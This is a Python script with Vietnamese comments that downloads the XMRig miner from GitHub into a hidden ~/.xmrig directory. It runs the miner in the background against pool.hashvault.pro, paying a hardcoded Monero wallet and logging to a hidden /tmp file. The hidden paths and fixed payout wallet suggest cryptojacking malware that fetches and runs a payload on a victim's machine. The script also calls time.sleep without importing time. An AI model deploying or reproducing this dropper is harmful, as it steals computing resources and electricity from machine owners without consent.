import os
import subprocess
import sys
import urllib.request
import tarfile

# ========= Cấu hình =========
POOL = "pool.hashvault.pro:443"
WALLET = "85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
WORKER = f"worker-{os.uname()[1]}"
CPU_THREADS = os.cpu_count()
LOG_FILE = "/tmp/.xmrig_hidden.log"
INSTALL_DIR = os.path.expanduser("~/.xmrig")
XMRIG_VERSION = "6.21.1"
XMRIG_URL = f"https://github.com/xmrig/xmrig/releases/download/v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-x64.tar.gz"

# ========= Hàm Tải và Giải Nén XMRig =========
def download_and_extract_xmrig():
    print("🚀 Đang tải và giải nén XMRig...")
    
    # Tải XMRig
    try:
        download_path = os.path.join(INSTALL_DIR, "xmrig.tar.gz")
        urllib.request.urlretrieve(XMRIG_URL, download_path)
        print(f"✅ Tệp đã tải về: {download_path}")
    except Exception as e:
        print(f"❌ Lỗi tải tệp: {e}")
        sys.exit(1)

    # Giải nén tệp XMRig
    try:
        with tarfile.open(download_path, "r:gz") as tar:
            tar.extractall(path=INSTALL_DIR)
        print(f"✅ Giải nén XMRig thành công.")
    except Exception as e:
        print(f"❌ Lỗi giải nén tệp: {e}")
        sys.exit(1)

# ========= Hàm Chạy XMRig =========
def run_xmrig():
    print("🛠️ Đang khởi động XMRig...")

    # Kiểm tra thư mục giải nén và lấy tên thư mục
    extracted_dir = None
    for item in os.listdir(INSTALL_DIR):
        if item.startswith("xmrig-") and os.path.isdir(os.path.join(INSTALL_DIR, item)):
            extracted_dir = os.path.join(INSTALL_DIR, item)
            break
    
    if not extracted_dir:
        print(f"❌ Không tìm thấy thư mục giải nén trong {INSTALL_DIR}.")
        sys.exit(1)
    
    # Kiểm tra tệp xmrig có tồn tại không
    xmrig_path = os.path.join(extracted_dir, "xmrig")
    if not os.path.exists(xmrig_path):
        print(f"❌ Không tìm thấy tệp xmrig ở đường dẫn {xmrig_path}.")
        sys.exit(1)

    # Tạo thư mục log nếu không tồn tại
    log_dir = os.path.dirname(LOG_FILE)
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

    # Chạy XMRig với các tham số cấu hình, sử dụng nohup để chạy trong nền
    try:
        subprocess.Popen(
            [xmrig_path, '-o', POOL, '-u', WALLET + '.' + WORKER, '--coin', 'monero', '--cpu-priority', '3', '--threads', str(CPU_THREADS), '--max-cpu-usage', '75', '--donate-level', '1', '--log-file', LOG_FILE],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print(f"✅ Đang đào Monero, tiến trình đang chạy ngầm.")
        print(f"📂 Log: {LOG_FILE}")
    except Exception as e:
        print(f"❌ Lỗi khi khởi động XMRig: {e}")
        sys.exit(1)

# ========= Main =========
def main():
    # Kiểm tra và tạo thư mục cài đặt nếu không tồn tại
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)

    # Tải và giải nén XMRig
    download_and_extract_xmrig()

    # Chạy XMRig
    run_xmrig()

    # Kiểm tra log để đảm bảo quá trình đang chạy
    print(f"📂 Đang theo dõi log tại {LOG_FILE}")
    try:
        # Đợi một chút trước khi đọc log
        print("Đang đợi để log được tạo...")
        for _ in range(10):  # Đợi 10 giây để log được ghi
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as log_file:
                    print(log_file.read())
                break
            time.sleep(1)  # Delay một giây và thử lại
        else:
            print(f"❌ Không thể tìm thấy tệp log sau 10 giây.")
    except Exception as e:
        print(f"❌ Không thể đọc log: {e}")

if __name__ == "__main__":
    main()
